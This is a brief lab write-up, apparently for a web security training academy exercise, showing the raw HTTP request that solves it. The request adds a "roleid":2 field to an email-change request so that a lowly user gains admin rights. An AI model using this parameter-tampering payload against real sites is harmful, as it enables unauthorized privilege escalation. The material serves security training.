@@ -1,0 +1,21 @@
+User role can be modified in user profile
+
+The solution provided is great. If you're unsure how the json is supposed to look like, 2 is an int. See below:
+
+Request:
+POST /my-account/change-email HTTP/1.1
+Host: acf01f361fc4e151805d224300d500ee.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: text/plain;charset=UTF-8
+Content-Length: 37
+Origin: https://acf01f361fc4e151805d224300d500ee.web-security-academy.net
+Connection: close
+Referer: https://acf01f361fc4e151805d224300d500ee.web-security-academy.net/my-account?id=wiener
+Cookie: session=alPQ2MOCBVqXqdXoUXjA7Sd7Bf8pk3Gw
+
+{"email":"asdf@asdf.com", "roleid":2}
+
+Armed with your new knowledge, go pay carlos a visit at /admin
